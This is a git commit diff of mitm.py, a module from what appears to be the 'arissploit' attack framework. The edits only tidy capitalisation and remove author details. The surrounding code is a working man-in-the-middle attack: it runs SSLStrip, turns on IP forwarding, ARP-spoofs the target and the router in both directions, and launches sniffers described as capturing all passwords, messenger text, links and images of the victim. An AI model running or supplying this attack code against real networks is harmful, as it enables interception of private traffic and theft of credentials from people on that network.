12c8e8332b3c1b931cdb282f8d854a37d5ff93b4
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2019-10-06 18:41:49 +0300

    Update mitm.py

--- modules/mitm.py
+++ modules/mitm.py
@@ -1,5 +1,3 @@
-
-
 from core.arissploit import *
 from core import colors
 import subprocess
@@ -8,10 +6,8 @@ import os
 conf = {
 	"name": "mitm",
 	"version": "1.0",
-	"shortdesc": "man in the middle attack",
-	"author": "entynetproject",
-	"github": "entynetproject",
-	"email": "entynetproject0@gmail.com",
+	"shortdesc": "Man in the middle attack.",
+	"author": "Entynetproject",
 	"initdate": "26.4.2016",
 	"lastmod": "29.12.2016",
 	"apisupport": False,
@@ -21,15 +17,15 @@ conf = {
 
 # List of the variables
 variables = OrderedDict((
-	('interface', ['eth0', 'network interface name']),
-	('router', ['192.168.1.1', 'router ip address']),
-	('target', ['192.168.1.2', 'target ip address']),
-	('sniffer', ['dsniff', 'sniffer name (select from sniffer list)']),
-	('ssl', ['true', 'SSLStrip, for SSL hijacking(true / false)']),
+	('interface', ['eth0', 'Network interface name.']),
+	('router', ['192.168.1.1', 'Router ip address.']),
+	('target', ['192.168.1.2', 'Target ip address.']),
+	('sniffer', ['dsniff', 'Sniffer name (select from sniffer list).']),
+	('ssl', ['true', 'SSLStrip, for SSL hijacking [true/false].']),
 ))
 
 # Additional notes to options
-option_notes = colors.green+' sniffers\t description'+colors.end+'\n --------\t ------------\n dsniff\t\t sniff all passwords\n msgsnarf\t sniff all text of victim messengers\n urlsnarf\t sniff victim links\n driftnet\t sniff victim images'
+option_notes = colors.green+'Sniffers\t description'+colors.end+'\n --------\t ------------\n dsniff\t\t sniff all passwords\n msgsnarf\t sniff all text of victim messengers\n urlsnarf\t sniff victim links\n driftnet\t sniff victim images'
 
 # Simple changelog
 changelog = "Version 1.0:\nrelease"
@@ -51,11 +47,11 @@ def run():
 		subprocess.Popen('sslstrip -p -k -f', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 	printInfo("IP forwarding...")
 	subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-	printInfo("ARP spoofing...")
+	printInfo("Arp spoofing...")
 	arp_spoofing1 = 'arpspoof -i ' + variables['interface'][0] + ' -t ' + variables['target'][0] +' '+ variables['router'][0]
 	subprocess.Popen(arp_spoofing1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 	arp_spoofing2 = 'arpspoof -i ' + variables['interface'][0] + ' -t ' + variables['router'][0] +' '+ variables['target'][0]
 	subprocess.Popen(arp_spoofing2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-	printInfo("sniffer starting...")
-	printInfo("ctrl + c to end")
+	printInfo("Sniffer starting...")
+	printInfo("Ctrl + C to end.")
 	os.system(selected_sniffer)
